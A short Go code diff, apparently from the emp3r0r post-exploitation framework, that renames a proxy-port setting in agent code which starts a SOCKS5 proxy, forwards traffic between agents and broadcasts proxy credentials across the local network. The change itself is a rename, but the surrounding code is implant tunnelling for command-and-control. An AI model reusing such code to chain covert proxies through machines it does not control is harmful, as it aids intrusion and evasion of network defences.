@@ -69,7 +69,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			RuntimeConfig.Password,                  // password of socks5 proxy
 
 			// To make this work, we forward the socks5 proxy from another agent to us
-			RuntimeConfig.Emp3r0rProxyServerPort) // port of socks5 proxy
+			RuntimeConfig.AgentSocksServerPort) // port of socks5 proxy
 
 		// wait for the proxy to work
 		for {
@@ -177,7 +177,7 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 			return
 		}
 		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
-		err := tun.TCPFwd(parsed_url.Host, RuntimeConfig.Emp3r0rProxyServerPort, ctx, cancel)
+		err := tun.TCPFwd(parsed_url.Host, RuntimeConfig.AgentSocksServerPort, ctx, cancel)
 		if err != nil {
 			log.Print("TCPFwd: ", err)
 		}
@@ -220,13 +220,13 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 
 	if start_socks5 {
 		// start a socks5 proxy
-		err := Socks5Proxy("on", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
+		err := Socks5Proxy("on", "0.0.0.0:"+RuntimeConfig.AgentSocksServerPort)
 		if err != nil {
 			log.Printf("Socks5Proxy on: %v", err)
 			return
 		}
 		defer func() {
-			err := Socks5Proxy("off", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
+			err := Socks5Proxy("off", "0.0.0.0:"+RuntimeConfig.AgentSocksServerPort)
 			if err != nil {
 				log.Printf("Socks5Proxy off: %v", err)
 			}
@@ -245,7 +245,7 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
 				RuntimeConfig.ShadowsocksLocalSocksPort,
 				RuntimeConfig.Password,
-				netip.IP.String(), RuntimeConfig.Emp3r0rProxyServerPort)
+				netip.IP.String(), RuntimeConfig.AgentSocksServerPort)
 			broadcastAddr := tun.IPbroadcastAddr(netip)
 			if broadcastAddr == "" {
 				continue
